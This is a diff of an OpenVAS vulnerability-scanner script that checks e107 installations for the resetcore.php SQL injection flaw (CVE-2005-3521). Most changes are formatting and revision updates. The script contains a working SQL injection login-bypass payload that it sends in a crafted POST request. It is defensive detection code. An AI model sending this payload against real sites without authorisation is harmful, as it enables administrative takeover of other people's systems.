@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: e107_sql_injection.nasl 9593 2018-04-25 01:36:56Z ckuersteiner $
+# $Id: e107_sql_injection.nasl 13975 2019-03-04 09:32:08Z cfischer $
 #
 # e107 resetcore.php SQL Injection
 #
@@ -31,8 +31,8 @@ CPE = "cpe:/a:e107:e107";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.20069");
-  script_version("$Revision: 9593 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-25 03:36:56 +0200 (Wed, 25 Apr 2018) $");
+  script_version("$Revision: 13975 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-04 10:32:08 +0100 (Mon, 04 Mar 2019) $");
   script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
   script_cve_id("CVE-2005-3521");
   script_bugtraq_id(15125);
@@ -54,13 +54,13 @@ if(description)
   script_tag(name:"solution", value:"Upgrade to e107 version 0.6173 or later.");
 
   script_tag(name:"summary", value:"The remote web server contains a PHP script that is prone to a SQL injection
-attack.");
+  attack.");
 
   script_tag(name:"insight", value:"The remote host appears to be running e107, a web content management system
-written in PHP. 
+  written in PHP.
 
-There is a flaw in the version of e107 on the remote host such that anyone can injection SQL commands through the
-'resetcore.php' script which may be used to gain administrative access trivially.");
+  There is a flaw in the version of e107 on the remote host such that anyone can injection SQL commands through the
+  'resetcore.php' script which may be used to gain administrative access trivially.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_app");
@@ -74,11 +74,11 @@ include("host_details.inc");
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
- 
+
 if( dir == "/" ) dir = "";
 
 host = http_host_name( port:port );
-variables = "a_name='%27+or+isnull%281%2F0%29%2F*&a_password=openvas&usubmit=Continue";  
+variables = "a_name='%27+or+isnull%281%2F0%29%2F*&a_password=vt-test&usubmit=Continue";
 
 url = dir + "/e107_files/resetcore.php";
 
@@ -91,8 +91,8 @@ if( egrep( pattern:"<input [^>]*name='a_(name|password)'", string:res ) ) {
 
   req = string( "POST ",url, " HTTP/1.1\r\n",
                 "Referer: http://", host, req, "\r\n",
-                "Host: ", host, "\r\n", 
-                "Content-Type: application/x-www-form-urlencoded\r\n", 
+                "Host: ", host, "\r\n",
+                "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(variables), "\r\n\r\n",
                 variables );
   buf = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
